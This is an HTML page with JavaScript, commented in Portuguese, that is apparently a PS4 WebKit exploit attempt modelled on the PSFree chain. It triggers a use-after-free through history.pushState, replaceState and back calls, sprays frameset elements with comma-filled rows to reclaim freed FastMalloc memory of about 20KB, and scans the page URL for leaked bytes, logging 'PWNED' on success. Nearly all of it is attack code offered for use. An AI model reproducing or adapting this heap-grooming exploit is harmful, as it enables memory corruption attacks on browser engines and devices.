<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - FastMalloc Alignment (PSFree Logic)</title>
<style>
    body { background-color: #0d0d0d; color: #00ff00; font-family: monospace; padding: 20px; }
    button { 
        padding: 20px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #0f0; background: #050; color: #fff;
    }
    #log { border: 1px solid #333; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 400px; overflow-y: scroll;}
    .success { color: #000; background-color: #00ff00; padding: 5px; font-weight: bold;}
</style>
</head>
<body>
<h2>PS4 WebKit - FastMalloc Reclaim (Medium Size)</h2>
<div id="status">Baseado na análise do psfree.mjs</div>

<button onclick="runFastMallocExploit()">INICIAR ATAQUE FASTMALLOC (20KB)</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
function log(m, type="") { 
    const d = document.createElement("div");
    if(type) d.className = type;
    d.textContent = m;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var keepAlive = [];

async function runFastMallocExploit() {
    logEl.innerHTML = "";
    keepAlive = []; 
    statusEl.innerText = "Preparando...";

    // 1. PREPARAÇÃO DO SPRAY (Baseado no psfree.mjs)
    // Estamos mirando em ~20KB. 
    // FastMalloc aloca em potências ou blocos alinhados.
    // 2500 vírgulas * 8 bytes = 20.000 bytes.
    
    log("1. Pré-calculando Framesets (Target: 20KB)...");
    let payloads = [];
    
    // Varredura de alinhamento: 2400 a 2600 vírgulas
    for(let i = 2400; i < 2600; i+=8) {
        try {
            payloads.push(",".repeat(i));
        } catch(e) {}
    }
    log(`Gerados ${payloads.length} payloads de FastMalloc.`);

    // 2. TRIGGER UAF (Reduzido para FastMalloc)
    log("2. Disparando UAF (Tamanho Médio)...");
    
    // Começamos pequeno e crescemos até atingir a zona de 20KB
    // UTF-16: 10.000 chars * 2 = 20.000 bytes
    let size = 100;
    const TARGET_CHARS = 10000; 
    const STEP = 500;

    for(let i = 0; i < 60; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 5 === 0) {
            // Tenta liberar a memória
            setTimeout(() => history.back(), 0);
        }
        
        // Aumenta até chegar no tamanho alvo (FastMalloc range)
        if(size < TARGET_CHARS) {
            size += STEP;
        } else {
            // Quando atingirmos o tamanho ideal (20KB), fazemos o SPRAY AGRESSIVO
            // Isso simula o comportamento do psfree que ataca blocos pequenos/médios
            if(i % 5 === 0) {
                 doSpray(payloads);
                 log(`Tentativa de Reclaim no tamanho ${size} chars...`);
            }
        }
        
        await sleep(5);
    }
    
    await sleep(200);

    // 3. VERIFICAÇÃO
    checkResult();
}

function doSpray(payloads) {
    // Cria centenas de objetos Frameset rapidamente
    // Isso deve preencher a "Free List" do FastMalloc
    for(let i=0; i < 200; i++) { // Spray menor mas mais frequente
        let idx = i % payloads.length;
        let f = document.createElement("frameset");
        f.rows = payloads[idx];
        keepAlive.push(f);
    }
}

function checkResult() {
    statusEl.innerText = "Verificando...";
    let url = document.URL;
    let changed = false;
    let sample = "";
    
    // O range de busca muda pois o tamanho da URL é menor agora
    let searchLimit = Math.min(url.length, 20000);

    for(let i=100; i<searchLimit; i++) {
        // Ignora os caracteres iniciais da URL (http...)
        if(url.charCodeAt(i) !== 0x56 && url.charCodeAt(i) !== 0x2f && url.charCodeAt(i) !== 0x3a) {
            // Filtro extra: psfree usa vírgulas que viram 0x00/0x01 na memória
            // Qualquer byte baixo (0-15) é um bom sinal
            if(url.charCodeAt(i) < 20) {
                changed = true;
                for(let k=0; k<16; k++) sample += url.charCodeAt(i+k).toString(16).padStart(2,'0') + " ";
                break;
            }
        }
    }

    if(changed) {
        log("!!! JACKPOT !!!", "success");
        log("FastMalloc Reclaim Sucesso!");
        log("Dados Binários: " + sample);
        statusEl.innerText = "PWNED: FASTMALLOC";
    } else {
        log("Falha: Ainda vendo 'V'.");
        log("Nota: Se falhar, significa que o UAF não está ocorrendo com objetos desse tamanho.");
    }
}
</script>
</body>
</html>
